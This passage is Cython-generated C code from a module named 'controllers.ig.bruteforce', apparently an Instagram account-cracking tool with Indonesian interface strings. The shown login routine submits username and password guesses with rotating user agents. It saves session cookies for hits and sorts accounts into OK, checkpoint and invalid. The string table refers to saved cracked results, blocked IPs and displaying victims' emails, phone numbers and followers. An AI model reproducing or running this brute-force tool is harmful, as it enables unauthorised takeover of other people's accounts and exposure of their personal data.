          PyObject *__pyx_temp[5] = {__pyx_t_9, __pyx_v_username, __pyx_v_password, __pyx_t_1, __pyx_v_user_agent};
          __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_10, __pyx_temp+1-__pyx_t_11, 4+__pyx_t_11); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 356, __pyx_L22_except_error)
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        } else
        #endif
        {
          __pyx_t_12 = PyTuple_New(4+__pyx_t_11); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 356, __pyx_L22_except_error)
          __Pyx_GOTREF(__pyx_t_12);
          if (__pyx_t_9) {
            __Pyx_GIVEREF(__pyx_t_9); PyTuple_SET_ITEM(__pyx_t_12, 0, __pyx_t_9); __pyx_t_9 = NULL;
          }
          __Pyx_INCREF(__pyx_v_username);
          __Pyx_GIVEREF(__pyx_v_username);
          PyTuple_SET_ITEM(__pyx_t_12, 0+__pyx_t_11, __pyx_v_username);
          __Pyx_INCREF(__pyx_v_password);
          __Pyx_GIVEREF(__pyx_v_password);
          PyTuple_SET_ITEM(__pyx_t_12, 1+__pyx_t_11, __pyx_v_password);
          __Pyx_GIVEREF(__pyx_t_1);
          PyTuple_SET_ITEM(__pyx_t_12, 2+__pyx_t_11, __pyx_t_1);
          __Pyx_INCREF(__pyx_v_user_agent);
          __Pyx_GIVEREF(__pyx_v_user_agent);
          PyTuple_SET_ITEM(__pyx_t_12, 3+__pyx_t_11, __pyx_v_user_agent);
          __pyx_t_1 = 0;
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_10, __pyx_t_12, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 356, __pyx_L22_except_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        }
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __pyx_r = __pyx_t_4;
        __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        goto __pyx_L23_except_return;
      }
      __pyx_L22_except_error:;

       
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_6);
      goto __pyx_L1_error;
      __pyx_L25_try_break:;
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_6);
      goto __pyx_L19_break;
      __pyx_L26_try_continue:;
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_6);
      goto __pyx_L18_continue;
      __pyx_L24_try_return:;
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_6);
      goto __pyx_L0;
      __pyx_L23_except_return:;
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_6);
      goto __pyx_L0;
    }
    __pyx_L18_continue:;
  }
  __pyx_L19_break:;

   
  __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_v_http, __pyx_n_s_cookies); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 358, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_13);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 358, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
  __pyx_t_13 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
    __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_5);
    if (likely(__pyx_t_13)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_13);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_5, function);
    }
  }
  __pyx_t_3 = (__pyx_t_13) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_13) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 358, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_v_cookie = __pyx_t_3;
  __pyx_t_3 = 0;

   
  if (unlikely(!__pyx_v_response)) { __Pyx_RaiseUnboundLocalError("response"); __PYX_ERR(0, 359, __pyx_L1_error) }
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_get); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 359, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_13 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
    __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_5);
    if (likely(__pyx_t_13)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_13);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_5, function);
    }
  }
  __pyx_t_3 = (__pyx_t_13) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_13, __pyx_n_u_userId) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_n_u_userId);
  __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 359, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_2 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 359, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (__pyx_t_2) {

     
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_7, &__pyx_t_8);
      __Pyx_XGOTREF(__pyx_t_6);
      __Pyx_XGOTREF(__pyx_t_7);
      __Pyx_XGOTREF(__pyx_t_8);
        {

         
        __pyx_t_5 = __Pyx_Globals(); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 361, __pyx_L37_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_13 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_u_app); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 361, __pyx_L37_error)
        __Pyx_GOTREF(__pyx_t_13);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_LIST_USER_AGENT); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 361, __pyx_L37_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        __pyx_t_13 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_u_ig); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 361, __pyx_L37_error)
        __Pyx_GOTREF(__pyx_t_13);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_index); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 361, __pyx_L37_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        __pyx_t_13 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_13)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_13);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
          }
        }
        __pyx_t_3 = (__pyx_t_13) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_13, __pyx_v_user_agent) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_v_user_agent);
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 361, __pyx_L37_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 361, __pyx_L37_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (unlikely(PyObject_SetItem(__pyx_v_cookie, __pyx_n_u_ua, __pyx_t_5) < 0)) __PYX_ERR(0, 361, __pyx_L37_error)
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

         
      }
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      goto __pyx_L42_try_end;
      __pyx_L37_error:;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

       
        {
        __Pyx_ErrRestore(0,0,0);
        goto __pyx_L38_exception_handled;
      }
      __pyx_L38_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
      __pyx_L42_try_end:;
    }

     
    if (unlikely(PyDict_SetItem(__pyx_v_results, __pyx_n_u_cookie, __pyx_v_cookie) < 0)) __PYX_ERR(0, 363, __pyx_L1_error)

     
    if (unlikely(PyDict_SetItem(__pyx_v_results, __pyx_n_u_status, __pyx_n_u_ok) < 0)) __PYX_ERR(0, 364, __pyx_L1_error)

     
    goto __pyx_L36;
  }

   
  if (unlikely(!__pyx_v_response)) { __Pyx_RaiseUnboundLocalError("response"); __PYX_ERR(0, 365, __pyx_L1_error) }
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_get); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 365, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_13 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_13)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_13);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_5 = (__pyx_t_13) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_13, __pyx_n_u_checkpoint_url) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_n_u_checkpoint_url);
  __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
  if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 365, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_2 = __Pyx_PyObject_IsTrue(__pyx_t_5); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 365, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (__pyx_t_2) {

     
    if (unlikely(PyDict_SetItem(__pyx_v_results, __pyx_n_u_status, __pyx_n_u_cp) < 0)) __PYX_ERR(0, 366, __pyx_L1_error)

     
    goto __pyx_L36;
  }

   
    {
    if (unlikely(PyDict_SetItem(__pyx_v_results, __pyx_n_u_status, __pyx_n_u_invalid) < 0)) __PYX_ERR(0, 368, __pyx_L1_error)
  }
  __pyx_L36:;

   
  __Pyx_XDECREF(__pyx_r);
  __Pyx_INCREF(__pyx_v_results);
  __pyx_r = __pyx_v_results;
  goto __pyx_L0;

   

   
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_12);
  __Pyx_XDECREF(__pyx_t_13);
  __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.login", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_results);
  __Pyx_XDECREF(__pyx_v_http);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_payload);
  __Pyx_XDECREF(__pyx_v_cookie);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start *__pyx_freelist_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start[8];
static int __pyx_freecount_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start = 0;

static PyObject *__pyx_tp_new_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start(PyTypeObject *t, CYTHON_UNUSED PyObject *a, CYTHON_UNUSED PyObject *k) {
  PyObject *o;
  if (CYTHON_COMPILING_IN_CPYTHON && likely((__pyx_freecount_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start > 0) & (t->tp_basicsize == sizeof(struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start)))) {
    o = (PyObject*)__pyx_freelist_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start[--__pyx_freecount_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start];
    memset(o, 0, sizeof(struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start));
    (void) PyObject_INIT(o, t);
    PyObject_GC_Track(o);
  } else {
    o = (*t->tp_alloc)(t, 0);
    if (unlikely(!o)) return 0;
  }
  return o;
}

static void __pyx_tp_dealloc_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start(PyObject *o) {
  struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start *p = (struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start *)o;
  PyObject_GC_UnTrack(o);
  Py_CLEAR(p->__pyx_v_self);
  if (CYTHON_COMPILING_IN_CPYTHON && ((__pyx_freecount_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start < 8) & (Py_TYPE(o)->tp_basicsize == sizeof(struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start)))) {
    __pyx_freelist_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start[__pyx_freecount_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start++] = ((struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start *)o);
  } else {
    (*Py_TYPE(o)->tp_free)(o);
  }
}

static int __pyx_tp_traverse_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start(PyObject *o, visitproc v, void *a) {
  int e;
  struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start *p = (struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start *)o;
  if (p->__pyx_v_self) {
    e = (*v)(p->__pyx_v_self, a); if (e) return e;
  }
  return 0;
}

static int __pyx_tp_clear_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start(PyObject *o) {
  PyObject* tmp;
  struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start *p = (struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start *)o;
  tmp = ((PyObject*)p->__pyx_v_self);
  p->__pyx_v_self = Py_None; Py_INCREF(Py_None);
  Py_XDECREF(tmp);
  return 0;
}

static PyTypeObject __pyx_type_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start = {
  PyVarObject_HEAD_INIT(0, 0)
  "controllers.ig.bruteforce.__init__.__pyx_scope_struct__start",  
  sizeof(struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start),  
  0,  
  __pyx_tp_dealloc_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start,  
  #if PY_VERSION_HEX < 0x030800b4
  0,  
  #endif
  #if PY_VERSION_HEX >= 0x030800b4
  0,  
  #endif
  0,  
  0,  
  #if PY_MAJOR_VERSION < 3
  0,  
  #endif
  #if PY_MAJOR_VERSION >= 3
  0,  
  #endif
  0,  
  0,  
  0,  
  0,  
  0,  
  0,  
  0,  
  0,  
  0,  
  0,  
  Py_TPFLAGS_DEFAULT|Py_TPFLAGS_HAVE_VERSION_TAG|Py_TPFLAGS_CHECKTYPES|Py_TPFLAGS_HAVE_NEWBUFFER|Py_TPFLAGS_HAVE_GC,  
  0,  
  __pyx_tp_traverse_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start,  
  __pyx_tp_clear_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start,  
  0,  
  0,  
  0,  
  0,  
  0,  
  0,  
  0,  
  0,  
  0,  
  0,  
  0,  
  0,  
  0,  
  0,  
  __pyx_tp_new_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start,  
  0,  
  0,  
  0,  
  0,  
  0,  
  0,  
  0,  
  0,  
  0,  
  #if PY_VERSION_HEX >= 0x030400a1
  0,  
  #endif
  #if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
  0,  
  #endif
  #if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
  0,  
  #endif
  #if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
  0,  
  #endif
};

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def);  
static int __pyx_pymod_exec_bruteforce(PyObject* module);  
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_bruteforce},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "bruteforce",
    0,  
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0,  
  #else
    -1,  
  #endif
    __pyx_methods  ,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots,  
  #else
    NULL,  
  #endif
    NULL,  
    NULL,  
    NULL  
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_kp_u_, __pyx_k_, sizeof(__pyx_k_), 0, 1, 0, 0},
  {&__pyx_n_s_BarColumn, __pyx_k_BarColumn, sizeof(__pyx_k_BarColumn), 0, 0, 1, 1},
  {&__pyx_n_s_Base, __pyx_k_Base, sizeof(__pyx_k_Base), 0, 0, 1, 1},
  {&__pyx_n_s_Base___init, __pyx_k_Base___init, sizeof(__pyx_k_Base___init), 0, 0, 1, 1},
  {&__pyx_n_s_Base__brute, __pyx_k_Base__brute, sizeof(__pyx_k_Base__brute), 0, 0, 1, 1},
  {&__pyx_n_s_Base_login, __pyx_k_Base_login, sizeof(__pyx_k_Base_login), 0, 0, 1, 1},
  {&__pyx_n_s_Base_my_profile, __pyx_k_Base_my_profile, sizeof(__pyx_k_Base_my_profile), 0, 0, 1, 1},
  {&__pyx_n_s_Base_profile_channel, __pyx_k_Base_profile_channel, sizeof(__pyx_k_Base_profile_channel), 0, 0, 1, 1},
  {&__pyx_n_s_Base_start, __pyx_k_Base_start, sizeof(__pyx_k_Base_start), 0, 0, 1, 1},
  {&__pyx_n_s_Base_start_locals_loading, __pyx_k_Base_start_locals_loading, sizeof(__pyx_k_Base_start_locals_loading), 0, 0, 1, 1},
  {&__pyx_n_s_Base_start_locals_normal, __pyx_k_Base_start_locals_normal, sizeof(__pyx_k_Base_start_locals_normal), 0, 0, 1, 1},
  {&__pyx_n_s_Base_start_locals_randoms, __pyx_k_Base_start_locals_randoms, sizeof(__pyx_k_Base_start_locals_randoms), 0, 0, 1, 1},
  {&__pyx_n_s_CP, __pyx_k_CP, sizeof(__pyx_k_CP), 0, 0, 1, 1},
  {&__pyx_n_s_CP_FILES_SAVED, __pyx_k_CP_FILES_SAVED, sizeof(__pyx_k_CP_FILES_SAVED), 0, 0, 1, 1},
  {&__pyx_kp_u_CP_bold_yellow, __pyx_k_CP_bold_yellow, sizeof(__pyx_k_CP_bold_yellow), 0, 1, 0, 0},
  {&__pyx_kp_u_CP_d_B_Y, __pyx_k_CP_d_B_Y, sizeof(__pyx_k_CP_d_B_Y), 0, 1, 0, 0},
  {&__pyx_n_s_ChunkedEncodingError, __pyx_k_ChunkedEncodingError, sizeof(__pyx_k_ChunkedEncodingError), 0, 0, 1, 1},
  {&__pyx_n_s_ConnectionError, __pyx_k_ConnectionError, sizeof(__pyx_k_ConnectionError), 0, 0, 1, 1},
  {&__pyx_kp_u_Cookie_theme_s, __pyx_k_Cookie_theme_s, sizeof(__pyx_k_Cookie_theme_s), 0, 1, 0, 0},
  {&__pyx_kp_u_Email_bold_red_Tidak_ada, __pyx_k_Email_bold_red_Tidak_ada, sizeof(__pyx_k_Email_bold_red_Tidak_ada), 0, 1, 0, 0},
  {&__pyx_kp_u_Email_theme_s, __pyx_k_Email_theme_s, sizeof(__pyx_k_Email_theme_s), 0, 1, 0, 0},
  {&__pyx_kp_u_Gunakan_random_User_Agent_bold_g, __pyx_k_Gunakan_random_User_Agent_bold_g, sizeof(__pyx_k_Gunakan_random_User_Agent_bold_g), 0, 1, 0, 0},
  {&__pyx_kp_u_Hasil_OK_theme_ok_Hasil_CP_theme, __pyx_k_Hasil_OK_theme_ok_Hasil_CP_theme, sizeof(__pyx_k_Hasil_OK_theme_ok_Hasil_CP_theme), 0, 1, 0, 0},
  {&__pyx_kp_u_Hasil_Tersimpan, __pyx_k_Hasil_Tersimpan, sizeof(__pyx_k_Hasil_Tersimpan), 0, 1, 0, 0},
  {&__pyx_n_s_Http, __pyx_k_Http, sizeof(__pyx_k_Http), 0, 0, 1, 1},
  {&__pyx_n_s_IG_REQUEST_HEADERS, __pyx_k_IG_REQUEST_HEADERS, sizeof(__pyx_k_IG_REQUEST_HEADERS), 0, 0, 1, 1},
  {&__pyx_n_s_IG_USER_AGENT, __pyx_k_IG_USER_AGENT, sizeof(__pyx_k_IG_USER_AGENT), 0, 0, 1, 1},
  {&__pyx_n_s_IP_IS_BLOCKED, __pyx_k_IP_IS_BLOCKED, sizeof(__pyx_k_IP_IS_BLOCKED), 0, 0, 1, 1},
  {&__pyx_kp_u_Jika_kamu_menggunakan_Wifi_mungk, __pyx_k_Jika_kamu_menggunakan_Wifi_mungk, sizeof(__pyx_k_Jika_kamu_menggunakan_Wifi_mungk), 0, 1, 0, 0},
  {&__pyx_kp_u_Jika_proses_stuk_atau_macet_nyal, __pyx_k_Jika_proses_stuk_atau_macet_nyal, sizeof(__pyx_k_Jika_proses_stuk_atau_macet_nyal), 0, 1, 0, 0},
  {&__pyx_n_s_LIST_USER_AGENT, __pyx_k_LIST_USER_AGENT, sizeof(__pyx_k_LIST_USER_AGENT), 0, 0, 1, 1},
  {&__pyx_kp_u_Mempersiapkan, __pyx_k_Mempersiapkan, sizeof(__pyx_k_Mempersiapkan), 0, 1, 0, 0},
  {&__pyx_kp_u_Menampilkan_informasi_akun_pada, __pyx_k_Menampilkan_informasi_akun_pada, sizeof(__pyx_k_Menampilkan_informasi_akun_pada), 0, 1, 0, 0},
  {&__pyx_kp_u_Mengikuti_bold_yellow_s, __pyx_k_Mengikuti_bold_yellow_s, sizeof(__pyx_k_Mengikuti_bold_yellow_s), 0, 1, 0, 0},
  {&__pyx_kp_u_Mengikuti_theme_s, __pyx_k_Mengikuti_theme_s, sizeof(__pyx_k_Mengikuti_theme_s), 0, 1, 0, 0},
  {&__pyx_n_u_Menit, __pyx_k_Menit, sizeof(__pyx_k_Menit), 0, 1, 0, 1},
  {&__pyx_kp_u_Nama_bold_yellow_s, __pyx_k_Nama_bold_yellow_s, sizeof(__pyx_k_Nama_bold_yellow_s), 0, 1, 0, 0},
  {&__pyx_kp_u_Nama_theme_s, __pyx_k_Nama_theme_s, sizeof(__pyx_k_Nama_theme_s), 0, 1, 0, 0},
  {&__pyx_kp_u_Nomor_Telepon_bold_red_Tidak_ada, __pyx_k_Nomor_Telepon_bold_red_Tidak_ada, sizeof(__pyx_k_Nomor_Telepon_bold_red_Tidak_ada), 0, 1, 0, 0},
  {&__pyx_kp_u_Nomor_Telepon_theme_s, __pyx_k_Nomor_Telepon_theme_s, sizeof(__pyx_k_Nomor_Telepon_theme_s), 0, 1, 0, 0},
  {&__pyx_n_s_OK, __pyx_k_OK, sizeof(__pyx_k_OK), 0, 0, 1, 1},
  {&__pyx_n_s_OK_FILES_SAVED, __pyx_k_OK_FILES_SAVED, sizeof(__pyx_k_OK_FILES_SAVED), 0, 0, 1, 1},
  {&__pyx_kp_u_OK_bold_green, __pyx_k_OK_bold_green, sizeof(__pyx_k_OK_bold_green), 0, 1, 0, 0},
  {&__pyx_kp_u_OK_d_B_Y, __pyx_k_OK_d_B_Y, sizeof(__pyx_k_OK_d_B_Y), 0, 1, 0, 0},
  {&__pyx_n_s_PROGRESS_CURRENT, __pyx_k_PROGRESS_CURRENT, sizeof(__pyx_k_PROGRESS_CURRENT), 0, 0, 1, 1},
  {&__pyx_kp_u_PWD_INSTAGRAM_BROWSER_0, __pyx_k_PWD_INSTAGRAM_BROWSER_0, sizeof(__pyx_k_PWD_INSTAGRAM_BROWSER_0), 0, 1, 0, 0},
  {&__pyx_kp_u_Pengikut_bold_yellow_s, __pyx_k_Pengikut_bold_yellow_s, sizeof(__pyx_k_Pengikut_bold_yellow_s), 0, 1, 0, 0},
  {&__pyx_kp_u_Pengikut_theme_s, __pyx_k_Pengikut_theme_s, sizeof(__pyx_k_Pengikut_theme_s), 0, 1, 0, 0},
  {&__pyx_kp_u_Postingan_bold_yellow_s, __pyx_k_Postingan_bold_yellow_s, sizeof(__pyx_k_Postingan_bold_yellow_s), 0, 1, 0, 0},
  {&__pyx_kp_u_Postingan_theme_s, __pyx_k_Postingan_theme_s, sizeof(__pyx_k_Postingan_theme_s), 0, 1, 0, 0},
  {&__pyx_n_s_Progress, __pyx_k_Progress, sizeof(__pyx_k_Progress), 0, 0, 1, 1},
  {&__pyx_kp_u_Proses_selesai_dalam, __pyx_k_Proses_selesai_dalam, sizeof(__pyx_k_Proses_selesai_dalam), 0, 1, 0, 0},
  {&__pyx_n_s_SESSION, __pyx_k_SESSION, sizeof(__pyx_k_SESSION), 0, 0, 1, 1},
  {&__pyx_n_s_START_TIME, __pyx_k_START_TIME, sizeof(__pyx_k_START_TIME), 0, 0, 1, 1},
  {&__pyx_kp_u_Sandi_Digunakan, __pyx_k_Sandi_Digunakan, sizeof(__pyx_k_Sandi_Digunakan), 0, 1, 0, 0},
  {&__pyx_kp_u_Setiap_theme_200_theme_500_akun, __pyx_k_Setiap_theme_200_theme_500_akun, sizeof(__pyx_k_Setiap_theme_200_theme_500_akun), 0, 1, 0, 0},
